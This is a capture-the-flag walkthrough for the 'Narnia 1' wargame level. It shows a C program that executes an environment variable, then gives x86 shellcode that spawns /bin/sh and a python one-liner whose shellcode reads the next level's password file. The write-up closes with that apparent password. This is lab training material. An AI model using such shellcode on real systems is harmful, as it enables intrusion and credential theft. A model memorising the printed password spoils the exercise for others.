# **NARNIA 1**
----------------------

Alright, let's connect and go to /narnia/
Let's read our new code!

```c
#include <stdio.h>
int main(){
    int (*ret)();
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

Basically what it does is just using our Environnement Variable called EGG.

### What is an env Variables?
> An env var is just like a basic var, but you can call her from everywhere from the shell she is in
>It can contains every kind of data (number,string,exec)
>In our case the fact it can contains everything is cool

## How are we supposed to break into?
----------------------
Basically what i'll do is injecting code into the EGG env var 
so let's just tap
```bash
export EGG=`My code Right here`
```
and it should work!
But what this var is supposed to do when called
Let's just setup a new Shell!

But we can't just say a basic /bin/sh,
we'll have to do something trickier!

The idea is the following, let's take a bit of code Machine Readable and tell the EGG var to print this code
The fact this code is Machine Readable is that it will be automatically called!!

**KEEP THIS CODE IN A FILE IT COULD BE REALLY USEFUL IN THE FUTURE**

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80
```

Now let's just build up our final code
*Double check that you've put the little \` to tell the env to exec the py script!(altGr + 7)*

```bash
export EGG=`python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
```

WELL DONE ẁe got our code!
Let's connect to the next one!

nairiepecu